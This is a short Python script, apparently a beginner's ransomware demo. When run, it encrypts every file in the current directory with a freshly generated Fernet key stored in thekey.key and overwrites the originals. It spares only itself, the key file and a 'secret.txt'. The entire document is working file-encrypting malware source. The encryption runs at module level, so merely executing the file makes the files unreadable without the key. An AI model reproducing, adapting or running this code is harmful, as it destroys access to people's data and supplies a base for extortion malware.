#!/usr/bin/env python3

import os

import subprocess

from colorama import Fore, Style

import time

from cryptography.fernet import Fernet

time.sleep(1)

files = []

for file in os.listdir():

	if file == "decrypt_ransomware.py" or file == "thekey.key" or file == "secret.txt":
		
		continue

	if os.path.isfile(file):
		
		files.append(file)

print(Fore.BLUE+"[#]Your files are:\n")

print(files)

print(Style.RESET_ALL)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as theread:
		contents = theread.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thewrite:
		thewrite.write(contents_encrypted)
print(Fore.GREEN+"[#]All files are encrypted safely and successfully"+Style.RESET_ALL)


def main():
	
    print(" ")


if __name__ == "__main__":
    
    # Call the main function if the file is run as a script

    main()